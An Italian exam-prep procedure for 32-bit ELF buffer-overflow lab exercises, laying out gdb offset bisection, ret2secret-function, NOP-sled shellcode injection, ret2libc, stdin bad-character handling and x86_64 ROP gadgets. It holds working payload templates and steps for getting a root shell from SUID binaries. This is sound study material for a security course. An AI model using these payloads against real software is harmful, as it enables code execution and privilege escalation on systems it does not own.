# Procedura Operativa — Binary Exploitation (buffer overflow x86_32)

> Sequenza fissa di azioni/comandi per qualunque esercizio di questa famiglia (eseguibile ELF 32-bit
> con `strcpy`/`gets` non validata). Solo l'algoritmo operativo + le **zone grigie/bivi** reali. Per
> il ragionamento sui rami vedi `guida_esame_binary.md`; per i 7 casi risolti,
> `modello_binary_exploitation.md`; per il deliverable, `template_report_binary.md`.

> ⚠️ **Regola d'oro n.1: ogni offset e ogni indirizzo li trovi TU sul binario che hai davanti.**
> Nessun numero di questa procedura o degli esempi è "il tuo": offset (nel pool: 16/44/212/622/~1518)
> e indirizzi cambiano per ogni binario. Il testo insegna *cosa* cercare, non *quale numero* digitare.

> ⚠️ **Regola d'oro n.2: prova TUTTE le funzioni candidate.** Il binario contiene di norma più
> funzioni "segrete" con nomi plausibili; quasi tutte sono decoy. Una sola stampa `SEC{...}`. Non
> fermarti alla prima né fidarti del nome.

---

## 0. Prima di toccare qualsiasi cosa

- [ ] **Leggi tutta la consegna.** Nota: (a) l'obiettivo — *stampare la flag* (→ ret2secret-function)
  o *eseguire shellcode/ottenere shell* (→ shellcode injection / ret2libc)? (b) i **deliverable**:
  tipicamente un file di testo (`bof.txt`/`pwn.txt`) + 2 o più screenshot; (c) se chiede anche la
  **password** (bonus, ex6/ex7).
- [ ] **Estrai e rendi eseguibile:**
  ```bash
  unzip <file>.zip        # oppure:  gunzip <file>.gz
  cd <cartella estratta>  # se presente
  chmod +x ./<bin>
  ```

## 1. Gate ambiente — ASLR

- [ ] **Disattiva ASLR** (deterministicità tra gdb e standalone):
  ```bash
  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space      # oppure da root: echo 0 > /proc/sys/kernel/randomize_va_space
  cat /proc/sys/kernel/randomize_va_space                    # verifica: deve essere 0
  ```
  ⚠️ **Non sopravvive al riavvio** e **gdb la disattiva per conto suo** sul processo debuggato: se
  l'exploit va in gdb ma fallisce fuori con SIGSEGV immediato e nessuna flag → ricontrolla che sia
  ancora `0` e rifai il comando (trabocchetto reale S4 es2).

## 2. Triage — classifica il binario (3 comandi)

```bash
file ./<bin>                          # atteso: ELF 32-bit LSB, Intel 80386
readelf -lW ./<bin> | grep GNU_STACK  # RWE = stack eseguibile (shellcode) ; RW = NX attivo
nm ./<bin> | grep -iE ' [tT] ' | grep -viE '__|_start|_init|_fini|frame_dummy|register|gmon'
ls -l ./<bin>                         # 's' nel campo utente (-rwsr-xr-x) = SUID-root
nm ./<bin> | grep -iE 'gets|fgets|read|scanf'   # vettore d'ingresso: stdin? (vedi §7.3-bis)
file ./<bin>                          # 32-bit (Intel 80386, atteso) o 64-bit (x86-64 → §7.9)?
```
- **Vettore d'ingresso — argv o stdin?** Se il payload entra da `argv[1]` (i 7 casi del pool:
  `./bin $(…)`) prosegui normalmente. Se il binario legge da **stdin** (`gets`/`fgets`/`read` presenti,
  e lanciato **senza argomenti si blocca in attesa**) → il trasporto e i bad char cambiano: **§7.3-bis**.
- **C'è una funzione che stampa la flag** (nome tipo `secret`, `reveal`, `super_*`, `*flag*`,
  `*hidden*`, `trythat`, `secret_function_*`)? → **§4 RET2SECRET-FUNCTION**.
- **No, e l'obiettivo è una shell**, stack **RWE**? → **§5 SHELLCODE INJECTION**.
- **No, e l'obiettivo è una shell**, stack **RW (NX)**? → **§6 RET2LIBC**.
- **PIE o non-PIE?** `nm` mostra indirizzi `0x0804…` = **non-PIE** (fissi); `0x0000…` = **PIE**
  (li leggi solo dopo un `run` in gdb, dove diventano `0x5655…`).

## 3. Trovare l'offset (comune a tutti i rami)

```bash
gdb ./<bin>
(gdb) run $(perl -e 'print "A"x200')           # alto: crash = overflow confermato
(gdb) run $(perl -e 'print "A"x100')           # dimezza
(gdb) run $(perl -e 'print "A"x150')           # bisezione...
(gdb) run $(perl -e 'print "A"x OFF ,"BBBB"')  # conferma finale
# atteso:  Program received signal SIGSEGV, 0x42424242 in ?? ()   ← OFF esatto
```
Interpreta il crash (vedi §7 zona grigia "stadi del crash"): `in <funzione>` = corto (EBP corrotto);
`SIGILL` = ret avvenuto, atterraggio storto; `0x42424242 in ?? ()` = controllo pieno = **OFF trovato**.

> ⚠️ **Se il binario legge da stdin** (§7.3-bis): il metodo di bisezione è **identico**, cambia solo la
> consegna — invece di `run $(perl -e '…')` scrivi il payload su file e usa `run < t.bin`:
> `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*OFF + b"BBBB")' > t.bin` poi `(gdb) run < t.bin`.

## 4. Ramo RET2SECRET-FUNCTION

- [ ] **Elenca le candidate.**
  ```bash
  nm ./<bin> | grep -iE ' [tT] '                 # non-PIE: indirizzi diretti
  # PIE:  (gdb) run ciao   →   (gdb) info functions     (SOLO dopo il run: prima vedi 0x0000…)
  ```
- [ ] **Prova ciascuna** sostituendo l'indirizzo in **little-endian** (byte invertiti):
  ```bash
  ./<bin> $(python -c 'print("A"*OFF + "\xLL\xLL\xHH\xHH")')
  # es. funzione a 0x56556877  →  "\x77\x68\x55\x56"
  ```
  finché compare `SEC{...}`. Le altre stampano messaggi decoy o crashano → scartale.
- [ ] Se un indirizzo candidato contiene un **bad character** (§7): applicane il rimedio.
- [ ] **Verifica** anche standalone (fuori gdb) per il payload finale del report.

## 5. Ramo SHELLCODE INJECTION (stack RWE)

- [ ] Copia lo **shellcode fornito** dal testo (tipico: 46 byte, apre `/bin/sh`). Verificane la
  lunghezza: `python3 -c "print(len(b'<shellcode>'))"`.
- [ ] Trova l'offset **OFF** (§3).
- [ ] Guarda dove atterrano i tuoi byte e scegli l'indirizzo del NOP sled:
  ```bash
  (gdb) x/200xw $esp        # cerca la fascia di 0x41414141 ; scegli un indirizzo AL CENTRO
  ```
- [ ] Componi: `[NOP] + [shellcode] + [indirizzo]`, con `len(NOP)+len(shellcode) = OFF`:
  ```bash
  ./<bin> $(python -c 'print("\x90"*(OFF-46) + "<46-byte shellcode>" + "\xLL\xLL\xHH\xHH")')
  ```
- [ ] ⚠️ **gdb ≠ standalone** (§7): se fallisce fuori, allarga il NOP sled o usa il **core dump** reale:
  ```bash
  sudo sysctl -w fs.suid_dumpable=1     # solo se SUID
  ./<bin> <payload>                      # crash da shell
  coredumpctl list ; sudo coredumpctl gdb <PID>
  (gdb) x/200xw $esp                     # vera fascia di NOP standalone
  ```
- [ ] Se **SUID-root**: verifica `id` → `uid=0(root)` **fuori** da gdb.

## 6. Ramo RET2LIBC (NX attivo, no funzione utile — non nel pool ma possibile)

```bash
gdb ./<bin>
(gdb) b *main
(gdb) run
(gdb) p system                      # indirizzo di system
(gdb) p exit                         # indirizzo di exit
(gdb) find $esp, +0x3000, "SHELL="   # trova /bin/sh in envp (poi +6 per scavalcare "SHELL=")
(gdb) delete 1
(gdb) run "$(perl -e 'print "\x90"x OFF ,"<system>","<exit>","<addr /bin/sh>"')"
```
Payload = `[padding OFF] + [system] + [exit] + [addr "/bin/sh"]`. Vedi §7 per i bad char di `system`
e l'inaffidabilità di `x/500s`.

## 7. Zone grigie / bivi — il nucleo (dai gotcha reali S4 + pool)

### 7.1 Gli stadi del crash nella bisezione (non è "tutto o niente")
Passando l'offset da corto a esatto, il crash **cambia natura** — riconoscere lo stadio evita di
cercare l'errore nel posto sbagliato:
- **`SIGSEGV … in <funzione> ()`** = EIP **non** dirottato: hai corrotto solo l'**EBP salvato** (prima
  del ret). Sei corto di qualche byte. *Non* è un problema di indirizzo.
- **`SIGILL … in <funzione> ()`** = il `ret` è avvenuto ma sei atterrato a metà istruzione. Offset
  quasi giusto.
- **`SIGSEGV 0x42424242 in ?? ()`** = EIP è esattamente `BBBB`: **controllo pieno**, offset esatto.
- Mnemonica: **`in <funzione>` → EIP non tuo** (correggi conteggio byte / payload); **`in ?? ()` →
  EIP tuo** (l'indirizzo è sotto controllo, se crasha è l'indirizzo a essere sbagliato/non eseguibile).

### 7.2 Bad character `0x00` (NUL) — `strcpy` si ferma
Se un indirizzo iniettato contiene `0x00`, `strcpy` lo tratta come fine stringa e tronca tutto ciò che
segue. Caso reale ex5: `super_function` a `0x56556300` → `\x00\x63\x55\x56` non iniettabile.
- **Rimedio se hai scelta** (era un decoy / bersaglio su NOP sled): usa un indirizzo vicino senza `0x00`.
- **Se è l'unico bersaglio con `0x00`**: nessun quoting aiuta (è `strcpy`, non la shell). Serve il byte
  adiacente ancora dentro la funzione/zona, o un vettore d'ingresso che non usi `strcpy`. *Nel pool la
  funzione **giusta** non ha mai avuto `0x00`.*

### 7.3 Bad character `0x20`/`0x0a`/`0x09` — word-splitting della shell su `$()` non quotato
Se un indirizzo contiene `0x20` (spazio), `0x0a` (newline) o `0x09` (tab) e il payload passa via
`$(...)` **non quotato**, la shell fa *word-splitting* e taglia l'argomento lì. Casi reali S4: es3
(indirizzo stack `0xffffca20`), es4 (indirizzo `system` `0xf7db1220`). Il sintomo è identico a un
payload "corto" (crash come se ci fosse solo il padding).
- **Rimedio A — bersaglio scelto da te** (NOP sled): **sposta** l'indirizzo di qualche decina di byte.
- **Rimedio B — indirizzo fisso** (`system`, unica funzione): **quota** la sostituzione →
  `run "$(perl -e '…')"`. Le doppie apici esterne bloccano lo split sui caratteri IFS preservandoli
  come byte del payload; le apici singole interne (perl) restano un contesto separato.
- **Riconosci in anticipo quale caso**: bersaglio con margine → sposta; indirizzo obbligato → quota.

### 7.3-bis Il binario legge da **stdin** (`gets`/`fgets`/`read`), non da `argv` — trasporto e bad char ribaltati
> Variante gemella di §7.2/§7.3. Nel pool tutti consegnano via `argv`; se un binario legge da stdin
> (esempi qui **didattici**, dichiarati tali), cambia il vettore e si **ribaltano** i bad char. Ramo
> completo e tabelle in `guida_esame_binary.md §4-bis`.

**Riconoscerlo:** `nm ./<bin> | grep -iE 'gets|fgets|read'` non vuoto **e** in `objdump -d` vedi
`call gets@plt`/`fgets@plt`/`read@plt` invece della catena che carica `argv[1]`; a conferma, lanciato
**senza argomenti il binario si blocca in attesa di input** (uno argv-based no).

**Consegna del payload** (tre vettori, preferisci byte grezzi con `python3`/`perl`, mai `echo`):
```bash
# A) pipe (comoda; MA per shell muore su EOF → usa B o C se l'obiettivo è una shell):
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*OFF + b"\xLL\xLL\xHH\xHH")' | ./<bin>
# B) here-string (aggiunge un \n finale, di solito innocuo):
./<bin> <<< "$(python3 -c '…')"
# C) file + redirect (il più robusto, stesso file in shell e in gdb):
python3 -c 'import sys; sys.stdout.buffer.write(b"…")' > payload.bin
./<bin> < payload.bin           #   (gdb)  run < payload.bin
```
⚠️ `echo` aggiunge `\n` e reinterpreta le sequenze; `printf` non aggiunge newline ma vuole `\xNN` esatti.
Per byte binari usa `python3 -c 'import sys; sys.stdout.buffer.write(b"…")'` (nessun newline fantasma).

**I bad char si RIBALTANO rispetto a §7.2/§7.3** (memorizza questo, è la trappola sotto stress):

| Byte | via `argv`+`strcpy` (§7.2/7.3) | via stdin+`gets` |
|---|---|---|
| `0x00` | **BAD** (strcpy tronca) | **USABILE** (gets non si ferma sul NUL) |
| `0x0a` (newline) | bad solo se `$()` non quotato → quota | **BAD principale** (gets termina l'input sulla `\n`; nessun quoting aiuta) |
| `0x20` / `0x09` | bad se `$()` non quotato → quota | **USABILI** (stdin è un flusso di byte, niente word-splitting) |

Sintesi: *via argv il nemico è `0x00`; via stdin il nemico diventa `0x0a`, e `0x00` è ora usabile.*
Dipende dalla funzione: `gets` → termina su `\n`, nessun limite; `fgets(buf,N,stdin)` → termina su `\n`
**e** limita a `N-1` byte (verifica `OFF+4 ≤ N-1`, altrimenti l'overflow non raggiunge il ret);
`read(0,buf,N)` → si ferma solo a `N` byte/EOF, **nessun byte proibito** (né `0x00` né `0x0a`): il più permissivo.

**Bisezione:** invariata concettualmente (§3), cambia solo l'invio (`run < t.bin` invece di
`run $(…)`); non inserire `0x0a` nel payload di prova con `gets` o tronchi la prova e leggi un offset falso.

### 7.4 Stack sotto gdb ≠ stack standalone (anche con ASLR off)
Un indirizzo che punta **sullo stack** (NOP sled in shellcode injection, o `/bin/sh` in ret2libc) può
funzionare in gdb e fallire fuori: gdb lancia con `argv[0]` = percorso assoluto, la shell con `./bin` →
il buffer si sposta anche di **centinaia di byte** (S4 es3: ~1000 byte di scarto).
- **Regola**: il dump di riferimento (`x/NxW $esp`) va preso nello **stesso contesto** in cui lancerai
  l'exploit. Se il bersaglio finale è `./bin` da shell, il dump deve venire da un **core dump** di
  `./bin` da shell, non da `gdb ./bin`.
- **SUID**: il core dump di un SUID non si salva di default (`fs.suid_dumpable=0`) → `sudo sysctl -w
  fs.suid_dumpable=1`; il core è di root → `sudo coredumpctl gdb <PID>`. Nel dump riconosci `./bin`
  come stringa (es. `0x73652f2e` = `./es` a byte) per orientarti.
- **Nota SUID sotto gdb**: il SUID è disattivato per i processi tracciati → una shell aperta in gdb dà
  `uid` normale anche se il binario è SUID; va riprovata **fuori**.

### 7.5 `x/500s $esp` inaffidabile su lunghe distanze
Cercando `SHELL=/bin/sh` in `envp` (ret2libc), `x/500s $esp` esaurisce il conteggio: appena dopo `main`
`$esp` è nel frame locale, pieno di `\x00` → centinaia di "stringhe vuote" consumano il conteggio prima
di arrivare a `envp` (molto più in alto).
- **Rimedio**: usa `find` con un pattern e una **lunghezza** (non un indirizzo di fine):
  `find $esp, +0x3000, "SHELL="`. ⚠️ Non far sforare l'aritmetica il limite `0xffffffff` (32 bit):
  `find $esp, $esp+20000, "SHELL="` può dare `Invalid search space` per overflow; usa `+lunghezza`.
- Per la stringa `/bin/sh`: punta al **valore** (`+6` per scavalcare `SHELL=`), non all'inizio della
  variabile.

### 7.6 Il crash DOPO la stampa è atteso, non un fallimento
In ret2secret-function, dopo che la funzione stampa `SEC{...}` segue quasi sempre un `Segmentation
fault` (il `ret` finale non ha uno stack coerente). **Non conta**: la flag esce prima. Conta solo che
la funzione target esegua. Vale anche per la shell (shellcode/ret2libc): se parte, l'exploit è riuscito.

### 7.7 PIE — `info functions` PRE-`run` mostra l'offset di link, non l'indirizzo reale
Su binari PIE (indirizzi `0x0000…` in `nm`), un `info functions` a gdb appena aperto mostra offset tipo
`0x000011ad` — **non** l'indirizzo a cui saltare. Serve un `run` (anche con argomento fittizio) prima:
a runtime (ASLR off) l'indirizzo diventa `0x5655…` stabile. Su **non-PIE** (`0x0804…`) l'indirizzo è
già quello giusto da `nm`, senza `run`.

### 7.8 Codice storico: `gets()` non dichiarato
Se ricompilassi un sorgente del lab (all'esame ricevi il binario già pronto, ma per completezza): glibc
recenti hanno tolto la dichiarazione di `gets` da `stdio.h` → `gcc` dà "implicit declaration". Fix:
aggiungi `extern char *gets(char *s);` in cima al `.c`. Dopo compila con solo un warning del linker.

### 7.9 Binario a **64 bit** (x86_64) — riserva, raramente necessario
> ⚠️ Pool e lab S4 sono **sempre 32 bit**. Se `file ./<bin>` dice `ELF 64-bit … x86-64`, ecco il minimo
> operativo (dettaglio in `guida_esame_binary.md §8`). Concetto, bisezione e gate **invariati**.
- **Indirizzi a 8 byte**: marcatore `"BBBBBBBB"`, crash atteso `RIP = 0x4242424242424242`; l'indirizzo
  nel payload sono **8** byte little-endian, non 4. Gli indirizzi tipici hanno byte alti `0x00` → via
  `argv`/`strcpy` **troncano**: spesso l'unica via è **stdin** (§7.3-bis, dove `0x00` è usabile).
- **ret2secret-function** (funzione senza argomenti): come a 32 bit, sovrascrivi il ret con l'indirizzo
  della funzione (solo 8 byte). Nessuna complicazione di registri.
- **ret2libc/con argomenti**: la convenzione System V passa gli argomenti nei registri (`rdi`, `rsi`,
  `rdx`…), non sullo stack → serve un gadget ROP `pop rdi ; ret` per caricare l'argomento prima di
  `system`. Cerca i gadget: `ROPgadget --binary ./<bin> | grep 'pop rdi'` (o `objdump -d ./<bin> | grep -B1 'ret'`).
  Payload: `[padding OFF] + [pop rdi;ret] + [addr "/bin/sh"] + [system]`; occhio all'allineamento stack a
  16 byte prima di `call system` (se crasha subito, aggiungi un gadget `ret` di padding). Segnala nel
  report la tecnica riconosciuta anche se non la completi.

## 8. Verifica e deliverable

- [ ] **ret2secret**: `SEC{...}` stampata (il segfault seguente è atteso).
- [ ] **shellcode/ret2libc**: shell aperta; se SUID, `id` → `uid=0(root)` fuori da gdb.
- [ ] Produci il report (`bof.txt`/`pwn.txt`) e gli screenshot secondo `template_report_binary.md`.

<!-- AUTO-LINKS:START -->
## 🔗 Collegati

- [[guida_esame_binary]]
- [[modello_binary_exploitation]]
- [[guida_lab_moduloS4_binary_exploits]]

**Hub:** [[master_map_studio]] · [[metodo_studio_esami_pratici]]
<!-- AUTO-LINKS:END -->
